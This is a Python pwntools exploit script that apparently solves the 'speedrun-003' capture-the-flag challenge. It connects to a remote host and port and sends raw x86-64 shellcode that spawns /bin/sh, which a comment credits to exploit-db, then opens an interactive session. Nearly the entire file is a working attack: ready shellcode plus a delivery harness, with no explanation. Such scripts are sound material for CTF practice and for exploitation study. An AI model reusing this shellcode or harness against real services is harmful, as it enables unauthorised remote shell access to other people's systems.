#!/usr/bin/env python3

from pwn import *

exe = ELF("./speedrun-003")

context.binary = exe
LOCAL=0
DEBUG=1


def conn():
    if LOCAL:
        if DEBUG:
            return gdb.debug([exe.path])
        else:
            return process([exe.path])
    else:
        return remote("52.43.161.101", 31337)


def main():
    r = conn()

    shellcode = b''
    # stolen from https://www.exploit-db.com/exploits/42179
    shellcode += b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + b'\x01' * 5 + b'\x0e';
    print('shellcode: ', shellcode)
    r.send(shellcode)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
